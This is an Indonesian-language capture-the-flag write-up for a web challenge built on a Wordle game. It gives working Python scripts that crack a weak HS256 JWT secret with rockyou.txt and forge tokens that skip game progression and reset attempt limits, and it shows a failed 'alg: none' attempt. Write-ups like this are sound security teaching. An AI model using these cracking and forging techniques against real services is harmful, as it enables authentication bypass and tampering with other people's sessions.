# Wrodle

- **Category:** Web
- **Challenge:** Wrodle
- **Flag:** `grodno{emmagtsrow}`

## Deskripsi

> Play Wrodle for free, no SMS or registration required.
>
> The resulting flag must be wrapped in the `grodno{}` format.

## Ringkasan

Aplikasi ini adalah game Wordle berisi 50 kata. State permainan disimpan di dalam JWT dengan algoritma `HS256`, termasuk nomor kata saat ini, jumlah nyawa, dan jumlah percobaan.

JWT ternyata ditandatangani memakai secret lemah: `butterfly`. Setelah secret ditemukan lewat dictionary attack, token bisa ditandatangani ulang dengan `current_word` diubah menjadi `51`. Endpoint `/api/finish` lalu menganggap seluruh kata sudah selesai dan mengembalikan koordinat:

```text
035 083 145 193 233 313 364 422 472 501
```

Koordinat tersebut dibaca sebagai:

```text
nomor kata + posisi huruf
```

Contohnya, `035` berarti ambil huruf ke-5 dari kata ke-3.

Kata-kata target kemudian diselesaikan otomatis lewat feedback Wordle dari endpoint `/api/guess`. Huruf yang terkumpul menghasilkan:

```text
emmagtsrow
```

Flag akhirnya:

```text
grodno{emmagtsrow}
```

---

## Recon awal

Halaman utama bisa diakses langsung:

```bash
curl http://10.112.0.12:44394
```

Dari HTML terlihat aplikasi memuat JavaScript utama:

```html
<script src="app.js"></script>
```

Source `app.js` kemudian diambil:

```bash
curl http://10.112.0.12:44394/app.js
```

Bagian penting dari frontend:

```javascript
const API_BASE = '/api';
const STORAGE_KEY = 'wordle_ctf_token';
```

Token permainan disimpan di local storage, lalu dipakai sebagai Bearer token:

```javascript
if (token) headers.Authorization = `Bearer ${token}`;
```

Endpoint yang dipakai frontend:

```text
POST /api/start
GET  /api/state
POST /api/guess
GET  /api/finish
```

State yang dikembalikan backend:

```javascript
state = {
  current_word: data.current_word,
  lives: data.lives,
  attempts: data.attempts,
  max_attempts: data.max_attempts,
  total_words: data.total_words,
  is_flag_word: data.is_flag_word,
  done: data.done,
};
```

Ini langsung nunjukin kalau progression game kemungkinan diambil dari JWT atau session yang terkait dengan JWT.

---

## Mendapatkan JWT

Session baru dibuat lewat endpoint `/api/start`:

```bash
curl -sS -i -X POST \
  http://10.112.0.12:44394/api/start \
  -H 'Content-Type: application/json'
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
```

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uIjoiODcwNDdlMzQtODQ4My00YzhlLWFmM2EtYWRjMzZlMzUyMDk5IiwiY3VycmVudF93b3JkIjoxLCJsaXZlcyI6OSwiYXR0ZW1wdHMiOjAsImlhdCI6MTc4Mzc3NTc1OX0.Z85OIoiTFmoXCI5Ogk5i6BXLXwwFzeZqFoxC02vIdZM",
  "current_word": 1,
  "lives": 9,
  "attempts": 0,
  "max_attempts": 6,
  "total_words": 50,
  "is_flag_word": false,
  "done": false
}
```

Payload JWT setelah didecode:

```json
{
  "session": "87047e34-8483-4c8e-af3a-adc36e352099",
  "current_word": 1,
  "lives": 9,
  "attempts": 0,
  "iat": 1783775759
}
```

Header JWT:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Berarti signature dibuat memakai HMAC-SHA256 dan sebuah shared secret.

---

## Cek endpoint `/api/finish`

Token asli dicoba langsung ke endpoint finish:

```bash
TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uIjoiODcwNDdlMzQtODQ4My00YzhlLWFmM2EtYWRjMzZlMzUyMDk5IiwiY3VycmVudF93b3JkIjoxLCJsaXZlcyI6OSwiYXR0ZW1wdHMiOjAsImlhdCI6MTc4Mzc3NTc1OX0.Z85OIoiTFmoXCI5Ogk5i6BXLXwwFzeZqFoxC02vIdZM'

curl -sS -i \
  http://10.112.0.12:44394/api/finish \
  -H "Authorization: Bearer $TOKEN"
```

Output:

```json
{
  "error": "not all words solved yet"
}
```

Endpoint ini jelas memeriksa progression permainan sebelum mengeluarkan data akhir.

---

## Percobaan `alg: none`

Sebelum cracking secret, token dicoba dimodifikasi menjadi JWT unsigned:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Payload diubah menjadi:

```json
{
  "current_word": 51
}
```

Backend menolak token tersebut:

```json
{
  "error": "invalid token",
  "detail": "alg \"none\" is not accepted"
}
```

Jadi bypass unsigned JWT tidak bisa dipakai. Signature HS256 tetap harus valid.

---

## Cracking secret JWT

Karena algoritmanya HS256, signature bisa diuji secara offline. Tidak perlu mengirim ribuan request ke server.

Secret dicari menggunakan wordlist lokal, termasuk `rockyou.txt`:

```python
import base64
import gzip
import hashlib
import hmac
import os
import sys

token = sys.argv[1]
message, encoded_signature = token.rsplit(".", 1)

signature = base64.urlsafe_b64decode(
    encoded_signature + "=" * (-len(encoded_signature) % 4)
)

def valid_secret(candidate: bytes) -> bool:
    calculated = hmac.new(
        candidate,
        message.encode(),
        hashlib.sha256,
    ).digest()

    return hmac.compare_digest(calculated, signature)

paths = [
    "/usr/share/wordlists/rockyou.txt.gz",
    "/usr/share/wordlists/rockyou.txt",
]

for path in paths:
    if not os.path.exists(path):
        continue

    opener = gzip.open if path.endswith(".gz") else open

    with opener(path, "rb") as wordlist:
        for line in wordlist:
            candidate = line.rstrip(b"\r\n")

            if candidate and valid_secret(candidate):
                print(candidate.decode(errors="replace"))
                raise SystemExit
```

Hasilnya:

```text
[+] SECRET: butterfly
```

JWT memakai secret yang ada di wordlist umum:

```text
butterfly
```

---

## Forge JWT

Setelah secret diketahui, token baru bisa ditandatangani dengan nilai progression palsu.

Nilai paling penting adalah:

```json
{
  "current_word": 51
}
```

Karena total permainan hanya 50 kata, `current_word = 51` menandakan semua kata sudah lewat.

Script forge:

```python
import base64
import hashlib
import hmac
import json
import time

secret = b"butterfly"

header = {
    "alg": "HS256",
    "typ": "JWT",
}

payload = {
    "session": "87047e34-8483-4c8e-af3a-adc36e352099",
    "current_word": 51,
    "lives": 9,
    "attempts": 0,
    "iat": int(time.time()),
}

def encode(data: dict) -> str:
    raw = json.dumps(
        data,
        separators=(",", ":"),
    ).encode()

    return base64.urlsafe_b64encode(raw).decode().rstrip("=")

message = f"{encode(header)}.{encode(payload)}"

signature = base64.urlsafe_b64encode(
    hmac.new(
        secret,
        message.encode(),
        hashlib.sha256,
    ).digest()
).decode().rstrip("=")

token = f"{message}.{signature}"

print(token)
```

Token hasil forge dikirim ke `/api/finish`:

```bash
curl -sS -i \
  http://10.112.0.12:44394/api/finish \
  -H "Authorization: Bearer $TOKEN"
```

Response:

```json
{
  "hint": "This doesn't look like a flag... maybe it's not letters, but directions to them.",
  "coordinates": "035 083 145 193 233 313 364 422 472 501"
}
```

---

## Memahami koordinat

Koordinat:

```text
035 083 145 193 233 313 364 422 472 501
```

Bukan koordinat geografis. Formatnya adalah:

```text
WWP
```

dengan:

- `WW` = nomor kata
- `P` = posisi huruf

Interpretasinya:

| Koordinat | Kata ke- | Huruf ke- |
|---|---:|---:|
| `035` | 3 | 5 |
| `083` | 8 | 3 |
| `145` | 14 | 5 |
| `193` | 19 | 3 |
| `233` | 23 | 3 |
| `313` | 31 | 3 |
| `364` | 36 | 4 |
| `422` | 42 | 2 |
| `472` | 47 | 2 |
| `501` | 50 | 1 |

Jadi hanya 10 kata dari total 50 yang perlu diselesaikan.

---

## Cara kerja feedback Wordle

Endpoint `/api/guess` menerima input:

```json
{
  "guess": "raise"
}
```

Response berisi feedback per karakter:

```json
{
  "feedback": [
    "present",
    "present",
    "absent",
    "absent",
    "correct"
  ]
}
```

Arti statusnya:

- `correct`: huruf benar dan posisi benar
- `present`: huruf ada, tapi posisinya salah
- `absent`: huruf tidak ada atau jumlah kemunculannya sudah habis

Masalahnya, game membatasi percobaan dan nyawa. Tapi karena secret JWT sudah diketahui, tiap request bisa memakai token baru dengan:

```json
{
  "attempts": 0,
  "lives": 9,
  "current_word": TARGET
}
```

Dengan begitu, limit percobaan praktis hilang.

---

## Strategi solver

Solver menjalankan beberapa langkah:

1. Buat session asli lewat `/api/start`.
2. Ambil `session` UUID dari token.
3. Forge token untuk nomor kata tertentu.
4. Kirim tebakan ke `/api/guess`.
5. Filter daftar kandidat berdasarkan feedback.
6. Ulangi sampai backend mengembalikan `correct: true`.
7. Ambil karakter sesuai koordinat.
8. Gabungkan seluruh karakter.

Daftar kandidat dibuat dari package `wordfreq`:

```python
from wordfreq import top_n_list

raw_words = top_n_list("en", 200000)

words = [
    word.lower()
    for word in raw_words
    if len(word) == 5
    and word.isascii()
    and word.isalpha()
]
```

Jumlah kandidat lokal:

```text
[+] Local candidates: 23452
```

---

## Simulasi feedback lokal

Agar kandidat bisa difilter tanpa menghabiskan request, solver punya implementasi Wordle lokal.

```python
from collections import Counter

def wordle_feedback(answer: str, guess: str) -> list[str]:
    result = ["absent"] * 5
    remaining = Counter()

    for index, (expected, submitted) in enumerate(zip(answer, guess)):
        if expected == submitted:
            result[index] = "correct"
        else:
            remaining[expected] += 1

    for index, submitted in enumerate(guess):
        if result[index] == "correct":
            continue

        if remaining[submitted] > 0:
            result[index] = "present"
            remaining[submitted] -= 1

    return result
```

Setiap kandidat dibandingkan dengan feedback server:

```python
def matches(candidate, guess, feedback):
    return wordle_feedback(candidate, guess) == feedback
```

Filtering:

```python
candidates = [
    candidate
    for candidate in candidates
    if matches(candidate, guess, feedback)
]
```

---

## Hasil solve tiap kata

### Kata ke-3

Tebakan:

```text
raise -> present present absent absent correct
clout -> correct absent absent absent absent
nymph -> present absent absent absent absent
stern -> absent absent present present present
crate -> correct correct correct absent correct
crane -> correct correct correct correct correct
```

Jawaban:

```text
crane
```

Koordinat `035` mengambil huruf ke-5:

```text
crane[5] = e
```

---

### Kata ke-8

Tebakan mengarah ke:

```text
lemon
```

Koordinat `083`:

```text
lemon[3] = m
```

---

### Kata ke-14

Jawaban:

```text
charm
```

Koordinat `145`:

```text
charm[5] = m
```

---

### Kata ke-19

Jawaban:

```text
beach
```

Koordinat `193`:

```text
beach[3] = a
```

---

### Kata ke-23

Jawaban:

```text
angel
```

Koordinat `233`:

```text
angel[3] = g
```

---

### Kata ke-31

Jawaban:

```text
watch
```

Koordinat `313`:

```text
watch[3] = t
```

---

### Kata ke-36

Jawaban:

```text
mouse
```

Koordinat `364`:

```text
mouse[4] = s
```

---

### Kata ke-42

Jawaban:

```text
brave
```

Koordinat `422`:

```text
brave[2] = r
```

---

### Kata ke-47

Jawaban:

```text
house
```

Koordinat `472`:

```text
house[2] = o
```

---

### Kata ke-50

Jawaban:

```text
whale
```

Koordinat `501`:

```text
whale[1] = w
```

---

## Rekonstruksi hasil

Seluruh hasil koordinat:

| Koordinat | Kata | Karakter |
|---|---|---|
| `035` | `crane` | `e` |
| `083` | `lemon` | `m` |
| `145` | `charm` | `m` |
| `193` | `beach` | `a` |
| `233` | `angel` | `g` |
| `313` | `watch` | `t` |
| `364` | `mouse` | `s` |
| `422` | `brave` | `r` |
| `472` | `house` | `o` |
| `501` | `whale` | `w` |

Gabung karakter sesuai urutan:

```text
emmagtsrow
```

Sesuai instruksi challenge, hasil dibungkus dengan format:

```text
grodno{emmagtsrow}
```
